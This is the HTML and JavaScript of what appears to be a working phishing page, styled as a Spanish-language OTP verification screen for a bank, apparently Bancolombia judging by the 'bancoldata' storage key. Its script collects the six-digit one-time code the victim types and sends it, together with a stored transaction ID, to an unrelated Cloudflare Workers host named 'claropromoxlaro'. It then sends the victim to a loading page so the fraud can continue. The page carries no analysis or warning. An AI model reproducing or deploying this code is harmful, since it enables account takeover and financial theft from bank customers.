<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación OTP</title>
    <style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    body, html {
        height: 100%;
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        background-color: #f0f0f0;
    }
    .image-container {
        width: 100%;
        height: 100%;
        overflow: hidden;
        position: relative;
    }
    .image-container img {
        width: 100%;
        height: 100%;
        object-fit: cover;
    }
    .center-box {
        position: absolute;
        top: 60%;
        left: 49.7%;
        transform: translate(-50%, -50%);
        background-color: rgb(255, 255, 255);
        width: 320px;
        height: 60px;
        display: flex;
        justify-content: center;
        align-items: center;
        border-radius: 8px;
    }
    .center-box .input-container {
        position: relative;
        width: 100%;
        display: flex;
        justify-content: space-between;
        gap: 1px;
    }
    .password-input {
        width: 40px;
        height: 60px;
        text-align: center;
        font-size: 20px;
        border: 1px solid #000000;
        border-radius: 5px;
        margin-right: 10px;
    }
    .button-container {
        position: absolute;
        top: 77.5%;
        left: 50%;
        transform: translate(-50%, -50%);
        display: flex;
        flex-direction: column;
        gap: 24px;
        transition: top 0.3s ease-in-out;
    }
    .button-container button {
        padding: 15px 120px;
        font-size: 16px;
        border: none;
        border-radius: 50px;
        font-weight: bold;
        color: rgb(1, 1, 1);
        cursor: pointer;
        transition: background-color 0.3s ease;
    }
    .button-container button:first-child {
        background-color: #ffda37;
        border: 1px solid black;
    }
    .button-container button:first-child:hover {
        background-color: #ffda37;
    }
    .button-container button:last-child {
        background-color: #bababa;
    }
    .button-container button:last-child:hover {
        background-color: #bababa;
    }
</style>
</head>
<body>
    <div class="image-container">
        <img src="img/cel3.jpg" alt="Background Image">
        <div class="center-box">
            <div class="input-container">
                <input type="tel" class="password-input" maxlength="1" id="input1">
                <input type="tel" class="password-input" maxlength="1" id="input2">
                <input type="tel" class="password-input" maxlength="1" id="input3">
                <input type="tel" class="password-input" maxlength="1" id="input4">
                <input type="tel" class="password-input" maxlength="1" id="input5">
                <input type="tel" class="password-input" maxlength="1" id="input6">
            </div>
        </div>
        <div class="button-container">
            <button id="continuar">Continuar</button>
            <button id="cancelar">Cancelar</button>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.password-input');

        // Auto-focus y validación de números
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                const value = e.target.value;
                
                // Solo permitir números
                if (!/^\d$/.test(value)) {
                    e.target.value = '';
                } else {
                    // Auto-enfocar siguiente input
                    if (index < inputs.length - 1 && e.target.value !== '') {
                        inputs[index + 1].focus();
                    }
                    
                    // Si todos los campos están llenos, enviar automáticamente
                    const allFilled = Array.from(inputs).every(input => input.value !== '');
                    if (allFilled) {
                        submitOtp();
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                }
            });
        });

        // Función para enviar OTP al worker
        async function submitOtp() {
            const otpCode = Array.from(document.querySelectorAll('.password-input'))
                                .map(input => input.value)
                                .join('');
            
            if (otpCode.length !== 6) {
                alert('Por favor ingresa el código completo de 6 dígitos');
                return;
            }

            try {
                // Obtener transactionId del localStorage
                const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                const transactionId = bancoldata.transactionId;

                if (!transactionId) {
                    alert('Error: No se encontró la transacción');
                    return;
                }

                console.log('Enviando OTP:', { transactionId, otp: otpCode });

                // Enviar OTP al worker
                const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        transactionId: transactionId,
                        otp: otpCode
                    })
                });

                const result = await response.json();
                console.log('Respuesta OTP:', result);

                if (result.ok) {
                    // Redirigir a loading para esperar siguiente acción
                    window.location.href = 'loading.html';
                } else {
                    alert('Error al enviar el código: ' + (result.error || 'Error desconocido'));
                }

            } catch (error) {
                console.error('Error enviando OTP:', error);
                alert('Error de conexión al enviar el código');
            }
        }

        document.getElementById('continuar').addEventListener('click', submitOtp);

        document.getElementById('cancelar').addEventListener('click', () => {
            window.location.href = 'index.html';
        });

        // Detectar apertura del teclado
        window.addEventListener('resize', () => {
            const buttonContainer = document.querySelector('.button-container');
            if (window.innerHeight < 500) {
                buttonContainer.style.top = '90%';
            } else {
                buttonContainer.style.top = '80.5%';
            }
        });

        // Auto-focus en el primer input al cargar la página
        window.addEventListener('load', () => {
            inputs[0].focus();
        });
    </script>
</body>
</html>
